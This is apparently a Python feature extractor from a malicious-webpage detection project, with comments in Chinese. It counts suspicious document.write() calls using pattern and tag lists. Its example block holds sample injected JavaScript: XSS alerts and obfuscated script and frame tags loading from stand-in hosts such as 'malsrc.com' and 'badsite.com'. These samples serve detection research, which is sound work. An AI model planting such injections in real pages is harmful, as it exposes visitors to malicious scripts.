import re

from src.static_features.js import *


# document.write()调用可能将恶意代码注入网页，并在加载时执行
class DocWriteJS(JSExtractor):
    def __init__(self, web_data):
        super().__init__(web_data)
        self.meta = ExtractorMeta(
            "js",
            "DocWriteJS",
            "InfectedWebContent2017",
            "document.write()中包含特定tag的特定模式出现次数",
            "1.0",
        )

    def extract(self) -> FeatureExtractionResult:
        js_content_list = self.web_data.content["js"]
        info_dict = {}
        for h in js_content_list:
            start_time = time.time()
            res = extract(h["content"])
            info_dict[h["filename"]] = {
                "count": res,
                "time": time.time() - start_time,
                "additional_info": {},
            }
        return FeatureExtractionResult(self.meta.filetype, self.meta.name, info_dict)


# 提取完整的document.write()调用。考虑括号的嵌套
def extract_document_writes(js_content: str):
    document_writes = []
    start_index = js_content.find("document.write(")
    while start_index != -1:
        count = 1
        end_index = start_index + 15  # 跳过 "document.write("
        while count > 0 and end_index < len(js_content):
            if js_content[end_index] == "(":
                count += 1
            elif js_content[end_index] == ")":
                count -= 1
            end_index += 1
        document_writes.append(js_content[start_index:end_index])
        start_index = js_content.find("document.write(", end_index)
    return document_writes


def extract(js_content: str):
    # 匹配从document.write(开始，直到字符串开始的标记（", ', 或 `），并且考虑了可能的空白字符（\s*）
    patterns = [
        "<script",
        "%3Cscript",
        "unescape(<",
        "unescape(%3C",
        "decodeURIComponent(<",
        "decodeURIComponent(%3C",
        "decodeURI(<",
        "decodeURI(%3C",
        "fromCharCode(<",
        "fromCharCode(%3C",
        "escape(<",
        "escape(%3C",
    ]

    # 定义需要匹配的标签
    tags = [
        "script",
        "scr",
        "iframe",
        "frame",
        "frameset",
        "object",
        "a",
        "link",
        "style",
        "embed",
        "applet",
        "meta",
        "area",
        "source",
        "video",
        "sound",
    ]

    # 初始化计数器
    suspicious_count = 0
    document_writes = extract_document_writes(js_content)
    for document_write in document_writes:
        for pattern in patterns:
            if pattern in document_write:
                if any(tag in document_write for tag in tags):
                    suspicious_count += 1
                    break

    # for pattern in patterns:
    #     # 对每个模式使用正则表达式进行匹配
    #     for match in re.finditer(pattern, js_content, re.IGNORECASE):
    #         print(f"match:{match.group()}")
    #         # 检查匹配项是否包含指定的标签
    #         if any(tag in match.group() for tag in tags):
    #             suspicious_count += 1

    return suspicious_count


# 示例使用
if __name__ == "__main__":
    js_content = """
    document.write("<script>alert('XSS');</script>");
    document.write(unescape("%3Cscript%3Ealert('XSS')%3C/script%3E"));

    document.write("<frameset rows="100%,* "frameborder="no"
    border="0" framespacing="0">
    <frame src=""http://malsrc.com"">
    </frameset>");

    document.write(unescape("%3Cscript src=’http://malsrc.com’
    type=’text/javascript’%3E%3C/script%3E"));

    document.write("<scr"+"ipt src=’" +http://badsite.com+
    "/mal.js’></scr"+"ipt>");
    """
    suspicious_count = extract(js_content)
    print(f"Suspicious document.write count: {suspicious_count}")

# patterns = [
#     r"document\.write\(<",
#     r"document\.write\(%3",
#     r"document\.write\(unescape\(<",
#     r"document\.write\(unescape\(%3",
#     r"document\.write\(decodeURIComponent\(<",
#     r"document\.write\(decodeURIComponent\(%3",
#     r"document\.write\(decodeURI\(<",
#     r"document\.write\(decodeURI\(%3",
#     r"document\.write\(fromCharCode\(<",
#     r"document\.write\(fromCharCode\(%3",
#     r"document\.write\(escape\(<",
#     r"document\.write\(escape\(%3",
# ]
# patterns = [
#     r"document\.write\(\s*(\"|'|`)<",
#     r"document\.write\(\s*(\"|'|`)%3",
#     r"document\.write\(\s*unescape\(\s*(\"|'|`)<",
#     r"document\.write\(\s*unescape\(\s*(\"|'|`)%3",
#     r"document\.write\(\s*decodeURIComponent\(\s*(\"|'|`)<",
#     r"document\.write\(\s*decodeURIComponent\(\s*(\"|'|`)%3",
#     r"document\.write\(\s*decodeURI\(\s*(\"|'|`)<",
#     r"document\.write\(\s*decodeURI\(\s*(\"|'|`)%3",
#     r"document\.write\(\s*fromCharCode\(\s*(\"|'|`)<",
#     r"document\.write\(\s*fromCharCode\(\s*(\"|'|`)%3",
#     r"document\.write\(\s*escape\(\s*(\"|'|`)<",
#     r"document\.write\(\s*escape\(\s*(\"|'|`)%3",
# ]
